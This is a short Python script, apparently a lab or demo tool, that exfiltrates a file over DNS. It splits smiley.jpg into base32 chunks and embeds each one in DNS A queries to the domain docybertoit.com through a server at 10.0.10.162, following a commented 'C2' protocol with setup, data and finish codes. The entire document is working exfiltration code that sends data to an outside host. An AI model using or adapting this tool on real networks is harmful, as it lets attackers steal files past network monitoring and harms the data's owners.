"""
### extract a file using DNS

###
"""

import base64
import uuid
import os
import dns.message
import dns.asyncquery
import dns.asyncresolver
from dns.exception import Timeout

file_uuid_str = f'{uuid.uuid4()}'
def main():

    
    file = open("smiley.jpg","rb")
    #data = file.read()
    file_b32_str_list = []  #list of base 32 encoded file chunks
    counter = 0
    while True:
        data = file.read(34)
        if not data:
            break
        b32_byte = base64.b32encode(data)
        b32_str = b32_byte.decode('utf-8')
        file_b32_str_list.append(b32_str)
        
    file.close()

    num_chunks = len(file_b32_str_list)

    """
    C2 codes
    A = setup query
    D = data query
    Z = file upload finished
    1. send setup_query, coded with A and number of file chunks
    2. send file_chunk_query, coded with D, each file chunk identified by its index
    3. send finish_query query with Z, denoting complete
    """

    setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
    send_query(setup_query)
    counter = 0
    for chunk in file_b32_str_list:
        file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
        send_query(file_chunk_query)
        counter += 1

    finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
    send_query(finish_query)


def send_query(query: str):
    """sends a query using the dnspython package to the c2 server. 
    """



    #https://dnspython.readthedocs.io/en/stable/query.html#dns.query.udp
    q = dns.message.make_query(query, 'A')
    try:
        r = dns.query.udp(q=q, where='10.0.10.162', timeout=.00001)
        print(r)
    except dns.exception.Timeout as e:
        return  # this is expected, we don't care about the return query
        print(e)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
    # send_query()